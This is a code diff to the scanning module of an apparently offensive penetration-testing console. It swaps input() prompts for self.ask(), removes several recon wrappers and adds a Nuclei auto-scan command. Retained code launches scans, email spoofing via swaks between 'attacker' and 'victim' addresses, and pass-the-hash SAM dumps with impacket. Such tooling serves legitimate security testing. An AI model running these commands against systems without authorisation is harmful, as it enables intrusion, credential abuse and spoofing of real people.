@@ -53,7 +53,6 @@ from utils import (
     print_error,
     print_msg,
     print_warn,
-    prompt,
     scanning_category,
 )
 
@@ -106,10 +105,9 @@ class ScanCommandSet(LazyOwnCommandSet):
 
         dirwordlist = self.params["dirwordlist"]
         choice = (
-            input(
+            self.ask(
                 "    [!] Enter the numer 1 to directory-list-2.3-medium.txt 2 to raft-large-words.txt [1/2] (Default 2): "
-            )
-            or "2"
+            , "2")
         )
         if choice == "2":
             dirwordlist = dirwordlist.replace("directory-list-2.3-medium.txt", "raft-large-words.txt")
@@ -137,226 +135,52 @@ class ScanCommandSet(LazyOwnCommandSet):
         self.cmd(f"gobuster dir --url http://{rhost}/ --wordlist {dirwordlist} {line} --add-slash")
         return
 
-    @cmd2.with_category(scanning_category)
-    def do_arpscan(self, line):
-        """
-        Executes an ARP scan using `arp-scan`.
 
-        This function performs an ARP scan on the local network using the `arp-scan` tool. The network device to be used for scanning must be specified.
+
+
+
+
+    @cmd2.with_category(scanning_category)
+    def do_auto_nuclei(self, line):
+        """
+        Context-ranked deterministic Nuclei sweep for the bound target.
+
+        Reads the world model and nmap XML, ranks the installed templates by
+        the observed services and CVEs, and runs the bounded winner set with
+        ``nuclei -jsonl``. Findings are published through the outcome bus so
+        the world model, findings ledger and reports stay consistent. The
+        run is capped by template count, rate limit and a hard wall-clock
+        deadline; no prompts and no template updates.
 
         Usage:
-            arpscan
+            auto_nuclei [target]
 
-        :param line: Command parameters (not used in this function).
-        :type line: str
-
-        - Executes the `arp-scan` command with the specified network device.
-
+        :param line: Optional explicit target; falls back to ``rhost``.
         :returns: None
-
-        Manual execution:
-        1. Ensure that the network device is assign using the appropriate parameter.
-        2. Run the method to perform an ARP scan.
-
-        Dependencies:
-        - `arp-scan` must be installed on the system.
-        - The `sudo` command must be available for executing `arp-scan`.
-
-        Examples:
-            1. assign the device parameter using `assign device <network_device>`.
-            2. Run `arpscan` to perform the ARP scan.
-
-        Note:
-            - The network device must be configured and available on the system for the scan to work.
-            - Ensure that `arp-scan` is installed and accessible from the command line.
         """
+        from modules.auto_nuclei import AutoNucleiEngine
 
-        if not self.params["device"]:
-            print_error("device must be assign")
+        target = line.strip() if line else self.params["rhost"]
+        if not check_rhost(target):
             return
-        device = self.params["device"]
-        print_msg("try to arp-scan sudo arp-scan -I DEVICE --localnet")
-        self.cmd(f"sudo arp-scan -I {device} --localnet")
-
-    @cmd2.with_category(scanning_category)
-    def do_dirsearch(self, line):
-        """
-        Runs the `dirsearch` tool to perform directory and file enumeration on a specified URL.
-
-        This function executes `dirsearch` to scan a given URL for directories and files, while excluding specific HTTP status codes from the results. If `dirsearch` is not installed, the function will attempt to install it before running the scan.
-
-        Usage:
-            dirsearch <url>
-
-        :param line: Not used in this function. The URL is provided via the `url` parameter.
-        :type line: str
-        :returns: None
-
-        Manual execution:
-        1. If `dirsearch` is present, the command `dirsearch -u <url> -x 403,404,400` is executed.
-        2. If `dirsearch` is not present, the function installs `dirsearch` using `sudo apt install dirsearch -y` and then runs the command.
-
-        Dependencies:
-        - `dirsearch` must be installed. If not present, it will be installed using `sudo apt`.
-        - Ensure the URL is assign via the `url` parameter before calling this function.
-
-        Example:
-            dirsearch http://example.com/
-
-        Note:
-            - Ensure that the `url` parameter is assign before calling this function.
-            - The `-x` option specifies HTTP status codes to exclude from the results (e.g., 403, 404, 400).
-            - The function will attempt to install `dirsearch` if it is not already installed.
-        """
-
-        url = self.params["url"]
-        if not url:
-            print_error("Url must be assign: use assign url http://url.ext/ more info in help assign")
+        if not is_binary_present("nuclei"):
+            print_warn(
+                "nuclei not found in PATH. Install: go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
+            )
             return
-        if is_binary_present("dirsearch"):
-            print_msg("[*] Try... dirsearch -u http://url.ext/ -x 403,404,400")
-            self.cmd(f"dirsearch -u {url} -x 403,404,400")
-        else:
-            print_error("dirsearch is not installed, installing... (control + c to cancel)")
-            self.cmd(f"sudo apt install dirsearch -y && dirsearch -u {url} -x 403,404,400")
-        return
-
-    @cmd2.with_category(scanning_category)
-    def do_dmitry(self, line):
-        """
-        This function constructs and executes a command for the 'dmitry' tool.
-        It first checks if the 'url' parameter is set. If not, it prints an error message.
-        If the 'url' is set, it extracts the domain from the URL using the get_domain function.
-        Then, it constructs a 'dmitry' command with the specified parameters and prepares it for execution.
-
-        Run a domain whois lookup (w), an IP whois lookup (i), retrieve Netcraft info (n), search for subdomains (s), search for email addresses (e), do a TCP port scan (p), and save the output to example.txt (o) for the domain example.com:
-
-        Parameters:
-        line (str): The command line input for this function.
-
-        Expected self.params keys:
-        - url (str): The URL to be used for the 'dmitry' command.
-
-        Example usage:
-        - assign url http://example.com
-        - do_dmitry
-        """
-        if not is_binary_present("dmitry"):
-            print_warn("Installing dmitry...")
-            self.cmd("sudo apt install dmitry -y")
-
-        url = self.params["url"]
-        if not url:
-            print_error(f"Url must be assign use{GREEN} assign url http://example.com")
+        print_msg(f"[*] auto_nuclei: ranking templates for {target}...")
+        result = AutoNucleiEngine().run(target)
+        if result.error:
+            print_error(f"auto_nuclei failed: {result.error}")
             return
-        domain = get_domain(url)
-
-        command = f"dmitry -winseo sessions/dmitry_{domain}.txt {domain}"
-        print_msg(command)
-        self.cmd(command)
-        return
-
-    @cmd2.with_category(scanning_category)
-    def do_feroxbuster(self, line):
-        """
-        Command feroxbuster: Installs and runs Feroxbuster for performing forced browsing and directory brute-forcing.
-
-        This function performs the following tasks:
-        1. Installs Feroxbuster using a `curl` command if it's not already installed.
-        2. Prompts the user for required inputs like the target URL, wordlist, file extensions, and additional options.
-        3. Executes Feroxbuster for directory enumeration and brute-force attacks.
-
-        Args:
-            line (str): Optional argument for specifying the target URL, wordlist, and other Feroxbuster options.
-
-        Returns:
-            None
-
-        Example:
-            feroxbuster -u http://example.com -w wordlist.txt -x php,html
-        """
-        url = self.params["url"]
-        wordlist = self.params["wordlist"]
-        path = os.getcwd()
-
-        exploit_dir = os.path.join(path, "external/.exploit")
-        feroxbuster_url = "https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh"
-        feroxbuster_bin = os.path.join(os.getenv("HOME"), ".local/bin/feroxbuster")
-
-        os.makedirs(exploit_dir, exist_ok=True)
-
-        if not os.path.exists(feroxbuster_bin):
-            print_msg("Installing Feroxbuster...")
-            self.cmd(f"curl -sL {feroxbuster_url} | bash -s $HOME/.local/bin")
-        else:
-            print_msg("Feroxbuster already installed, skipping installation.")
-
-        if not line:
-            url = input(f"    {GREEN}[!] Enter the target URL (default: {url}): ").strip() or url
-            wordlist = input(f"    [?] Enter the wordlist file (default: {wordlist}): ").strip() or wordlist
-            extensions = input("    [?] Enter file extensions (comma-separated, optional): ").strip()
-            headers = input("    [?] Enter additional headers (optional): ").strip()
-            recursion = input("    [?] Enable recursion? (y/n, default 'y'): ").strip().lower() or "y"
-            verbosity = input("    [?] Verbosity level (1-3, default '1'): ").strip() or "1"
-
-        else:
-            args = line.split()
-            url = args[0] if len(args) > 0 else ""
-            wordlist = args[1] if len(args) > 1 else ""
-            extensions = args[2] if len(args) > 2 else ""
-            headers = args[3] if len(args) > 3 else ""
-            recursion = args[4] if len(args) > 4 else "y"
-            verbosity = args[5] if len(args) > 5 else "1"
-
-        if not url:
-            print_warn("No URL provided, aborting scan.")
-            return
-
-        wordlist_option = f"-w {wordlist}" if wordlist else ""
-        extensions_option = f"-x {extensions.replace(',', ' -x ')}" if extensions else ""
-        headers_option = f"-H {headers}" if headers else ""
-        recursion_option = "--no-recursion" if recursion == "n" else ""
-        verbosity_option = f"-{'v' * int(verbosity)}"
-
-        command = f"{feroxbuster_bin} -u {url} {wordlist_option} {extensions_option} {headers_option} {recursion_option} {verbosity_option}"
-
-        print_msg(f"Running Feroxbuster scan: {command}")
-        self.cmd(command)
-        return
-
-    @cmd2.with_category(scanning_category)
-    def do_nmapscript(self, line):
-        """Perform an Nmap scan using a specified script and port.
-
-        :param line: A string containing the Nmap script and port, separated by a space. Example: "http-enum 80".
-
-        :returns: None
-
-        Manual execution:
-        To manually run an Nmap scan with a script and port, use the following command format:
-
-            nmap --script <script> -p <port> <target> -oN <output-file>
-
-        Example:
-        If you want to use the script `http-enum` on port `80` for the target `10.10.10.10`, you would run:
-
-            nmap --script http-enum -p 80 10.10.10.10 -oN sessions/webScan_10.10.10.10
-
-        Ensure you have the target host (`rhost`) assign in the parameters and provide the script and port as arguments. The results will be saved in the file `sessions/webScan_<rhost>`.
-        """
-
-        rhost = self.params["rhost"]
-        if not check_rhost(rhost):
-            return
-        parts = line.split(" ", 2)
-        if len(parts) != 2:
-            print_error("Usage: nmapscript <script> <port>")
-            return
-        script = parts[0]
-        port = parts[1]
-        print_msg(f"Try... nmap -sCV --script {script} -p{port} {rhost} -oN sessions/{script}_{rhost}")
-        self.cmd(f"nmap -sCV --script {script} -p{port} {rhost} -oN sessions/{script}_{rhost}")
-        return
+        print_msg(f"[*] templates selected: {len(result.templates)} (context-ranked)")
+        for item in result.templates[:10]:
+            print_msg(f"  [{item.template.severity}] {item.template.id} (score {item.score})")
+        print_msg(f"[*] findings: {result.finding_count if hasattr(result, 'finding_count') else len(result.findings)}")
+        for finding in result.findings[:10]:
+            print_msg(f"  [{finding.get('severity', 'info')}] {finding.get('template-id', finding.get('id', '?'))} {finding.get('matched-at', '')}")
+        if result.artifact:
+            print_msg(f"[*] artifact: {result.artifact}")
 
     @cmd2.with_category(scanning_category)
     def do_nuclei(self, line):
@@ -384,12 +208,12 @@ class ScanCommandSet(LazyOwnCommandSet):
                 return
         domain = get_domain(rhost)
         output_file = f"sessions/{domain}_nuclei_output.txt"
-        choice = input("    [?] do you want use extra templates path: (y/n) ") or "y"
+        choice = self.ask("    [?] do you want use extra templates path: (y/n) ", "y")
         if choice == "y":
-            install = input("    [?] do you want clone extra templates repo: (y/n) ") or "y"
+            install = self.ask("    [?] do you want clone extra templates repo: (y/n) ", "y")
             if install == "y":
                 self.cmd("cd .. && git clone https://github.com/projectdiscovery/nuclei-templates.git 2>/dev/null")
-            path = input("    [!] Enter the path to templates (default ../nuclei-templates): ") or "../nuclei-templates"
+            path = self.ask("    [!] Enter the path to templates (default ../nuclei-templates): ", "../nuclei-templates")
             cmd = ["nuclei", "-t", path, "-u", rhost, "-o", output_file, "-tags", "cve"]
         else:
             cmd = ["nuclei", "-u", rhost, "-o", output_file, "-tags", "cve"]
@@ -400,35 +224,6 @@ class ScanCommandSet(LazyOwnCommandSet):
         except subprocess.CalledProcessError as e:
             print_error(f"Error running Nuclei scan: {e}")
 
-    @cmd2.with_category(scanning_category)
-    def do_amass(self, line):
-        """
-        Executes Amass to perform a passive enumeration on a given domain.
-
-        This function performs the following steps:
-        1. Executes the Amass tool with the provided domain for passive enumeration.
-        2. Saves the results to a file named 'results.txt' in the current directory.
-
-        Parameters:
-        line (str): The domain to be enumerated, e.g., 'example.com'.
-
-        Returns:
-        None
-        """
-        if line:
-            domain = line.strip()
-        else:
-            domain = self.params["domain"]
-        if not domain:
-            print_error("No domain provided. Please provide a valid domain to enumerate.")
-            return
-
-        command = f"amass enum -passive -d {domain} -o sessions/amass_{domain}_results.txt"
-        print_msg(f"Running Amass for domain {domain}...")
-
-        self.cmd(command)
-        self.logcsv(f"amass {command}")
-        print_msg(f"Amass enumeration completed. Results saved in sessions/amass_{domain}_results.txt.")
 
     @cmd2.with_category(scanning_category)
     def do_bbot(self, line):
@@ -459,7 +254,7 @@ class ScanCommandSet(LazyOwnCommandSet):
             domain = self.params.get("domain", "localhost")
 
             choice = (
-                input("    [!] Enter the mode (1 Subdomain, 2 Spider, 3 Email, 4 Web, 5 Web thorough, 6 All): ") or "6"
+                self.ask("    [!] Enter the mode (1 Subdomain, 2 Spider, 3 Email, 4 Web, 5 Web thorough, 6 All): ", "6")
             )
 
             if choice == "1":
@@ -508,9 +303,12 @@ class ScanCommandSet(LazyOwnCommandSet):
             'bash -c "bash <(curl -fsSL https://raw.githubusercontent.com/osmedeus/osmedeus-base/master/install.sh)"'
         )
 
-        if not os.path.exists(osmedeus_path):
+        if not os.path.isdir(osmedeus_path):
             print_warn("Osmedeus is not installed. Cloning the repository and installing dependencies.")
             self.cmd(f"git clone {osmedeus_repo} {osmedeus_path}")
+            if not os.path.isdir(osmedeus_path):
+                print_error(f"Osmedeus clone failed: {osmedeus_path} missing")
+                return
             os.chdir(osmedeus_path)
             self.cmd(go_install_cmd)
             print_msg("Osmedeus installation completed.")
@@ -531,11 +329,11 @@ class ScanCommandSet(LazyOwnCommandSet):
         for key, description in scan_types.items():
             print_msg(f"  {key}. {description}")
 
-        scan_choice = input("    [!] Enter the number corresponding to your choice (default: 1): ").strip() or "1"
+        scan_choice = self.ask("    [!] Enter the number corresponding to your choice (default: 1): ", "1")
         flow = scan_types.get(scan_choice, "general").split()[0]
         domain = self.params["domain"]
         url = self.params["url"]
-        target = input(f"    [!] Enter the target (e.g., {domain}, list_of_targets.txt): ").strip() or domain
+        target = self.ask(f"    [!] Enter the target (e.g., {domain}, list_of_targets.txt): ", domain)
         if not target:
             print_warn("A target is required to execute the scan.")
             return
@@ -543,11 +341,11 @@ class ScanCommandSet(LazyOwnCommandSet):
         additional_params = ""
         if flow in ["cidr", "repo-scan"]:
             if flow == "cidr":
-                additional_params = input(
+                additional_params = self.ask(
                     "    [!] Enter CIDR format (e.g., 1.2.3.4/24) or leave empty for file input: "
-                ).strip()
+                )
             elif flow == "repo-scan":
-                additional_params = input(f"    [!] Enter the repository URL {url} or folder path: ").strip() or url
+                additional_params = self.ask(f"    [!] Enter the repository URL {url} or folder path: ", url)
 
         osmedeus_command = f"osmedeus scan -f {flow} -t {target} {additional_params}".strip()
         print_msg(f"Executing Osmedeus with command: {osmedeus_command}")
@@ -595,10 +393,10 @@ class ScanCommandSet(LazyOwnCommandSet):
 
         if not args:
             print_msg("No arguments provided. Please specify target options.")
-            target = input(f"Enter target domain default {url}: ").strip() or url
-            mode = input("Enter mode option (-a, -p, -x, -r, -v, -m): ").strip() or "-a"
+            target = self.ask(f"Enter target domain default {url}: ", url)
+            mode = self.ask("Enter mode option (-a, -p, -x, -r, -v, -m): ", "-a")
             notification = (
-                input("Enable notifications via Discord, Telegram, or Slack? (yes/no): ").strip().lower() or "no"
+                self.ask("Enable notifications via Discord, Telegram, or Slack? (yes/no): ").lower() or "no"
             )
 
             if notification == "yes":
@@ -665,7 +463,7 @@ class ScanCommandSet(LazyOwnCommandSet):
         done; wait
         """.replace("        ", "").replace("{pattern}", pattern)
         print_msg(command)
-        execute = input("Do you want to execute? (yes/no): ").strip().lower()
+        execute = self.ask("Do you want to execute? (yes/no): ").lower()
         if execute == "yes":
             self.cmd(command)
         else:
@@ -725,7 +523,7 @@ class ScanCommandSet(LazyOwnCommandSet):
         done
         """.replace("        ", "").replace("{rhost}", rhost)
         print_msg(command)
-        execute = input("Do you want to execute? (yes/no): ").strip().lower()
+        execute = self.ask("Do you want to execute? (yes/no): ").lower()
         if execute == "yes":
             self.cmd(command)
         else:
@@ -790,62 +588,13 @@ class ScanCommandSet(LazyOwnCommandSet):
         done
         """.replace("        ", "").replace("{rhost}", rhost)
         print_msg(command)
-        execute = input("Do you want to execute? (yes/no): ").strip().lower()
+        execute = self.ask("Do you want to execute? (yes/no): ").lower()
         if execute == "yes":
             self.cmd(command)
         else:
             copy2clip(command)
         return
 
-    @cmd2.with_category(scanning_category)
-    def do_skipfish(self, line):
-        """
-        This function executes the web security scanning tool Skipfish
-        using the provided configuration and parameters. It allows
-        scanning a specified target (rhost) and saves the results
-        in a designated output directory.
-
-        Parameters:
-        - self: Refers to the instance of the class in which this function is defined.
-        - line: A string that may contain additional options to modify the scanning behavior.
-
-        Function Flow:
-        1. Default values are set for the target IP (rhost), port (port), and output directory (outputdir).
-        2. The validity of the target (rhost) is checked using the `check_rhost` function.
-        3. If no argument is provided in `line`, a `skipfish` command is constructed using the default values.
-        4. If `line` starts with 'url', the URL configured in `self.params['url']` is retrieved and used to construct the `skipfish` command.
-        5. If the URL is not configured and an attempt is made to use the 'url' option, an error message is printed, and the function exits.
-        6. The constructed `skipfish` command is displayed on the console and executed using `os.system`.
-
-        Note:
-        - The function assumes that the `skipfish` tool is installed on the system.
-        - The output of the scan is saved in the directory `sessions/{rhost}/skipfish/`.
-        - The wordlist used by Skipfish is specified in `wordlist`.
-        """
-
-        port = 80
-        s = ""
-
-        wordlist = "/usr/share/skipfish/dictionaries/complete.wl"
-        rhost = self.params["rhost"]
-
-        if not check_rhost(rhost):
-            return
-        outputdir = f"sessions/{rhost}/skipfish/"
-        if not line:
-            command = f"skipfish -o {outputdir} -S {wordlist} http{s}://{rhost}:{port}"
-        else:
-            if line.startswith("url"):
-                url = self.params["url"]
-                if not url:
-                    print_error(
-                        f"You need assign the url if use the parametter url ex: {GREEN}assign url http://url.ext/"
-                    )
-                    return
-                command = f"skipfish -o {outputdir} -S {wordlist} {url}"
-        print_msg(command)
-        self.cmd(command)
-        return
 
     @cmd2.with_category(scanning_category)
     def do_vscan(self, line):
@@ -882,17 +631,16 @@ class ScanCommandSet(LazyOwnCommandSet):
         print_msg("Gathering parameters for vscan port scanning...")
 
         rhost = self.params["rhost"]
-        hosts = input("    [!] Enter the hosts to scan (comma-separated): ").strip() or rhost
+        hosts = self.ask("    [!] Enter the hosts to scan (comma-separated): ", rhost)
         if not hosts:
             print_error("    [!] Hosts cannot be empty!")
             return
 
         ports = (
-            input("    [!] Enter the ports to scan (comma-separated or range): ").strip()
-            or "80,443,22,21,23,25,110,143,53,3306,8080,3389,135,139,445,993,995,1723,111,5900,1025,465,587,49152,49153,49154,49155,49156,49157,548,631,993,2049,444,5000,5060,5800,53,111,179,123,137,138,69,514,2049,520,162,4500"
+            self.ask("    [!] Enter the ports to scan (comma-separated or range): ", "80,443,22,21,23,25,110,143,53,3306,8080,3389,135,139,445,993,995,1723,111,5900,1025,465,587,49152,49153,49154,49155,49156,49157,548,631,993,2049,444,5000,5060,5800,53,111,179,123,137,138,69,514,2049,520,162,4500")
         )
 
-        output_file = input("    [!] Enter the output file : ").strip() or hosts.replace(",", "_")
+        output_file = self.ask("    [!] Enter the output file : ", hosts.replace(",", "_"))
 
         command = f"cd sessions && vscan -host {hosts} -p {ports} -v"
 
@@ -963,12 +711,11 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
                 if line.startswith("rid"):
                     if not os.path.exists(f"{path}/sessions/credentials.txt"):
                         username = (
-                            input(
+                            self.ask(
                                 "    [!] Enter the username with self.params['domain'] (default 'Administrator'): "
-                            ).strip()
-                            or "administrator"
+                            , "administrator")
                         )
-                        password = input("    [!] Enter the password (default: admin): ").strip() or "admin"
+                        password = self.ask("    [!] Enter the password (default: admin): ", "admin")
                     else:
                         path_cred = get_credentials(True)
                         with open(path_cred) as file:
@@ -987,10 +734,10 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
                     path_cred = get_credentials(True)
 
                     if not os.path.exists(path_cred):
-                        username = input(
+                        username = self.ask(
                             "    [!] Enter the username with self.params['domain'] (e.g., 'user@self.params['domain'].com'): "
-                        ).strip()
-                        password = input("    [!] Enter the password: ").strip()
+                        )
+                        password = self.ask("    [!] Enter the password: ")
                     else:
                         with open(path_cred) as file:
                             for file_line in file:
@@ -1007,10 +754,10 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
                     path_cred = get_credentials(True)
 
                     if not os.path.exists(path_cred):
-                        username = input(
+                        username = self.ask(
                             "    [!] Enter the username with self.params['domain'] (e.g., 'user@self.params['domain'].com'): "
-                        ).strip()
-                        password = input("    [!] Enter the password: ").strip()
+                        )
+                        password = self.ask("    [!] Enter the password: ")
                     else:
                         with open(path_cred) as file:
                             for file_line in file:
@@ -1137,7 +884,7 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
                     params = file_line.split(":")
                     user = params[0]
                     passwd = params[1].replace("\n", "")
-                    dc = input(f"    [!] enter DC subdomain example dc01: (Default: {subdomain})") or subdomain
+                    dc = self.ask(f"    [!] enter DC subdomain example dc01: (Default: {subdomain})", subdomain)
 
                     if dc:
                         sub = f" -gc '{dc}.{self.params['domain']}' "
@@ -1182,9 +929,9 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
         rhost = self.params["rhost"]
         if not check_rhost(self.params["rhost"]):
             return
-        from_attacker = input(f"    {CYAN}[?] {MAGENTA}FROM:  {RESET}").strip()
-        to_victim = input(f"    {CYAN}[?] {MAGENTA}TO:  {RESET}").strip()
-        body = input(f"    {CYAN}[?] {MAGENTA}BODY:  {RESET}").strip()
+        from_attacker = self.ask(f"    {CYAN}[?] {MAGENTA}FROM:  {RESET}")
+        to_victim = self.ask(f"    {CYAN}[?] {MAGENTA}TO:  {RESET}")
+        body = self.ask(f"    {CYAN}[?] {MAGENTA}BODY:  {RESET}")
         command = f"swaks --from {from_attacker} --to {to_victim} --body {body} --server {self.params['rhost']}"
         self.cmd(command)
         copy2clip(command)
@@ -1229,7 +976,7 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
             else:
                 hashis = f"-hashes :{hash_value}"
 
-            input("    [!] Enter Username (default: Administrator): ") or "Administrator"
+            self.ask("    [!] Enter Username (default: Administrator): ", "Administrator")
             command = f"impacket-samrdump -port 139 -target-ip {self.params['rhost']} {hashis} -dc-ip {self.params['rhost']} {self.params['domain']}"
             print_msg(command)
             self.cmd(command)
@@ -1245,127 +992,9 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
 
         return
 
-    @cmd2.with_category("02. Scanning & Enumeration")
-    def do_lynis(self, line):
-        """
-        Performs a Lynis audit on the specified remote system.
 
-        This function executes the `modules/lazylynis.sh` script with the target host defined in the `self.params['rhost']` parameter. It is used to perform a security audit of the remote system using Lynis.
 
-        Usage:
-            lynis
 
-        :param line: This parameter is not used in the current implementation.
-        :type line: str
-        :returns: None
-
-        Manual execution:
-        To manually run this task, ensure that the `modules/lazylynis.sh` script is available and executable. Provide the target host in the format `lynis`.
-        sudo lynis audit system remote 10.10.10.10 more info check modules/lazylynis.sh
-        Note: The function assumes that `self.params['rhost']` is a valid host address. If `self.params['rhost']` is not valid, it will print an error message. For more details, check `modules/lazylynis.sh`.
-        """
-
-        rhost = self.params["rhost"]
-        if not check_rhost(self.params["rhost"]):
-            return
-
-        print_msg(f"Try... sudo modules/lazylynis.sh {self.params['rhost']}")
-        self.cmd(f"sudo modules/lazylynis.sh {self.params['rhost']}")
-
-        return
-
-    @cmd2.with_category("02. Scanning & Enumeration")
-    def do_snmpcheck(self, line):
-        """
-        Performs an SNMP check on the specified target host.
-
-        This function executes the `snmp-check` command against the target host defined in the `self.params['rhost']` parameter.
-
-        Usage:
-            snmpcheck
-
-        :param line: This parameter is not used in the current implementation.
-        :type line: str
-        :returns: None
-
-        Manual execution:
-        To manually run this task, ensure that `snmp-check` is installed and provide a target host in the format `snmpcheck`.
-        snmp-check 10.10.10.10
-        Note: The function assumes that `self.params['rhost']` is a valid host address. If `self.params['rhost']` is not valid, it will print an error message.
-        """
-        rhost = self.params["rhost"]
-        if not check_rhost(self.params["rhost"]):
-            return
-
-        print_msg(f"Try... snmp-check {self.params['rhost']}")
-        self.cmd(f"snmp-check {self.params['rhost']}")
-        return
-
-    @cmd2.with_category("02. Scanning & Enumeration")
-    def do_snmpwalk(self, line):
-        """
-        Performs an SNMP check on the specified target host.
-
-        This function executes the `snmp-check` command against the target host defined in the `self.params['rhost']` parameter.
-
-        Usage:
-            snmpwalk
-
-        :param line: This parameter is not used in the current implementation.
-        :type line: str
-        :returns: None
-
-        Manual execution:
-        To manually run this task, ensure that `snmpwalk -v 2c -c public` is installed and provide a target host in the format `snmpcheck`.
-        snmpwalk -v 2c -c public 10.10.10.10
-        Note: The function assumes that `self.params['rhost']` is a valid host address. If `self.params['rhost']` is not valid, it will print an error message.
-        """
-        rhost = self.params["rhost"]
-        if not check_rhost(self.params["rhost"]):
-            return
-
-        print_msg(f"Try... snmpwalk -v 2c -c public {self.params['rhost']}")
-        self.cmd(f"snmpwalk -v 2c -c public {self.params['rhost']}")
-        return
-
-    @cmd2.with_category("02. Scanning & Enumeration")
-    def do_smtpuserenum(self, line):
-        """
-        Enumerates SMTP users using the `smtp-user-enum` tool with the VRFY method.
-
-        1. Checks if the `self.params['rhost']` (remote host) parameter is set:
-        - If not set, displays an error message and exits the function.
-
-        2. Checks if the `usrwordlist` (user wordlist) parameter is provided:
-        - If not provided, displays an error message indicating that the `p` or `payload` parameter should be used to load payloads.
-
-        3. If both parameters are provided:
-        - Displays the command that will be executed for user enumeration.
-        - Runs `sudo smtp-user-enum -M VRFY -U <usrwordlist> -t <self.params['rhost']>` to perform user enumeration.
-
-        :param line: Not used in this function.
-        :type line: str
-        :returns: None
-
-        Manual execution:
-        To manually run these tasks, you would need to:
-        - Ensure that the `self.params['rhost']` parameter is assign with the target IP address using `set self.params['rhost'] <IP>`.
-        - Load the user wordlist using the `assign usrwordlist <path>` command.
-        - Execute the command `sudo smtp-user-enum -M VRFY -U <usrwordlist> -t <self.params['rhost']>`.
-        - Ex: sudo smtp-user-enum -M VRFY -U /usr/share/wordlists/SecLists-master/Usernames/xato-net-10-million-usernames.txt -t 10.10.10.10
-        Note: Ensure that you have the necessary permissions to run `smtp-user-enum` with `sudo` and that the wordlist file exists at the specified path.
-        """
-
-        rhost = self.params["rhost"]
-        usrwordlist = self.params["usrwordlist"]
-        if not check_rhost(self.params["rhost"]):
-            return
-        if not usrwordlist:
-            print_error("use p or payload to load payloads parameters")
-            return
-        print_msg(f"Try... sudo smtp-user-enum -M VRFY -U {usrwordlist} -t {self.params['rhost']}")
-        self.cmd(f"sudo smtp-user-enum -M VRFY -U {usrwordlist} -t {self.params['rhost']}")
-        return
 
     @cmd2.with_category("02. Scanning & Enumeration")
     def do_sessionssh(self, line):
@@ -1570,11 +1199,11 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
             rhost = line
         else:
             rhost = self.params["rhost"]
-            if not check_rhost(self.params["rhost"]):
-                return
+        if not check_rhost(rhost):
+            return
 
-        output_file = f"sessions/{self.params['rhost']}_parsero_output.txt"
-        cmd = ["parsero", "-u", self.params["rhost"], "-sb"]
+        output_file = f"sessions/{rhost}_parsero_output.txt"
+        cmd = ["parsero", "-u", rhost, "-sb"]
 
         try:
             with open(output_file, "w") as f:
@@ -1583,76 +1212,7 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
         except subprocess.CalledProcessError as e:
             print_error(f"Error running parsero scan: {e}")
 
-    @cmd2.with_category("02. Scanning & Enumeration")
-    def do_changeme(self, line):
-        """
-        Executes a changeme scan on a specified target URL or host.
 
-        Usage:
-            changeme [-o <output file>] --oa -t 20 self.params['rhost']
-
-        If a URL is provided as an argument, it will be used as the target for the scan.
-        Otherwise, it will use the target specified in self.params['rhost'].
-        """
-        if not is_binary_present("changeme"):
-            print_warn("Installing changeme...")
-            self.cmd("sudo apt install changeme -y")
-
-        if line:
-            rhost = line
-        else:
-            rhost = self.params["rhost"]
-            if not check_rhost(self.params["rhost"]):
-                return
-
-        output_file = f"sessions/{self.params['rhost']}_changeme_output"
-        cmd = ["changeme", "-a", "-o", output_file, "--oa", "-t", "20", self.params["rhost"]]
-        try:
-            subprocess.run(cmd, check=True)
-
-        except subprocess.CalledProcessError as e:
-            print_error(f"Error running changeme scan: {e}")
-        return
-
-    @cmd2.with_category("02. Scanning & Enumeration")
-    def do_enum4linux_ng(self, line):
-        """
-        Performs enumeration of information from a target system using `enum4linux-ng`.
-
-        1. Executes the `enum4linux-ng` command with the `-A` option to gather extensive information from the specified target.
-
-        :param line: This parameter is not used in the current implementation but could be used to pass additional options or arguments if needed.
-        :param self.params['rhost']: The target host for enumeration, specified in the `params` dictionary.
-
-        :returns: None
-
-        Manual execution:
-        To manually enumerate information from a system, use the following command:
-            enum4linu-ng -A <target_host>
-
-        Replace `<target_host>` with the IP address or hostname of the target system.
-
-        For example:
-            enum4linux-ng -A 192.168.1.10
-        """
-
-        if not is_binary_present("enum4linux-ng"):
-            print_warn("Installing enum4linux-ng...")
-            self.cmd("sudo apt install enum4linux-ng -y")
-
-        if line:
-            rhost = line
-        else:
-            rhost = self.params["rhost"]
-            if not check_rhost(self.params["rhost"]):
-                return
-
-        rhost = self.params["rhost"]
-        print_msg(
-            f"Try... enum4linux-ng -A {self.params['rhost']} -oY sessions/{self.params['rhost']}_enum4linux-ng {RESET}"
-        )
-        self.cmd(f"enum4linux-ng -A {self.params['rhost']} -oY sessions/{self.params['rhost']}_enum4linux-ng")
-        return
 
     @cmd2.with_category("02. Scanning & Enumeration")
     def do_fuzz(self, line):
@@ -1685,13 +1245,13 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
             rhost = self.params["rhost"]
             if not check_rhost(self.params["rhost"]):
                 return
-        target_port = input("    [!] Enter the target port: ")
-        http_method = input("    [!] Enter the HTTP method (e.g., GET, POST): ")
-        directory = input("    [!] Enter the directory to fuzz (e.g., /): ")
-        file_extension = input("    [!] Enter the file extension to test (e.g., .php, .asp): ")
-        additional_extension = input("    [!] Enter any additional file extension (e.g., .zip): ")
-        status_code_1 = input("    [!] Enter the first expected status code (e.g., 200, 404): ")
-        status_code_2 = input("    [!] Enter the second expected status code (if any, otherwise leave blank): ")
+        target_port = self.ask("    [!] Enter the target port: ")
+        http_method = self.ask("    [!] Enter the HTTP method (e.g., GET, POST): ")
+        directory = self.ask("    [!] Enter the directory to fuzz (e.g., /): ")
+        file_extension = self.ask("    [!] Enter the file extension to test (e.g., .php, .asp): ")
+        additional_extension = self.ask("    [!] Enter any additional file extension (e.g., .zip): ")
+        status_code_1 = self.ask("    [!] Enter the first expected status code (e.g., 200, 404): ")
